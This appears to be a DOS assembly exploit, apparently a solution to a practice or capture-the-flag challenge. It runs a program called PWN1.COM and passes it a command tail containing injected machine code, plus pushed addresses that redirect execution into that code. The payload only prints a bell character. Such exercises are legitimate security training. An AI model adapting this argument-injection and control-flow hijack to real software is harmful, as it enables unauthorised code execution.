.model tiny
.code
org 100h
 
Start:
        mov ah, 4ah
        mov bx, 1000h
        int 21h

        push es
        push ds

        mov [stkseg], ss
        mov [stkptr], sp

        mov ax, cs:[2ch]
        mov [wEnvSegPT], ax
        mov ax, cs
        mov word ptr [pfrFCB_1PT], 005ch
        mov word ptr [pfrFCB_1CS], ax
        mov word ptr [pfrFCB_2PT], 006ch
        mov word ptr [pfrFCB_2CS], ax

        mov word ptr [pfCmdTailPT], offset ChildParams
        mov word ptr [pfCmdTailCS], ax
 
        mov ax, 4b00h
        mov dx, offset ChildProcess
        mov bx, offset ExecParamRec
        int 21h
 
        cli
        mov ss, cs:[stkseg]
        mov sp, cs:[stkptr]
        sti

        pop ds
        pop es

        jnc @@exit_func
                mov ah, 09h
                mov dx, offset asErrExec
                int 21h
@@exit_func:
	mov ax, 4c00h
	int 21h


asErrExec:    db 0dh, 0ah, "Exec failed", 0dh, 0ah, '$'
ChildProcess: db "PWN1.COM", 0

ChildParams:
	db offset ENDCPS - offset STARTCPS

STARTCPS:
	db ' '
CDS:
	mov ah, 02h
	mov dl, 06h
	add dl, 01h
	int 21h

	push (offset AfterCall) - (offset CDS) + 82h
	push 014eh
	ret
AfterCall:
	mov ax, 4c00h
	int 21h
ENDCPS:
	db 0dh

ExecParamRec:
	wEnvSegPT         dw      0

	pfCmdTailPT       dw      0
	pfCmdTailCS       dw      0

	pfrFCB_1PT        dw      0
	pfrFCB_1CS        dw      0

	pfrFCB_2PT        dw      0
	pfrFCB_2CS        dw      0

stkseg          dw      0
stkptr          dw      0
 
end Start
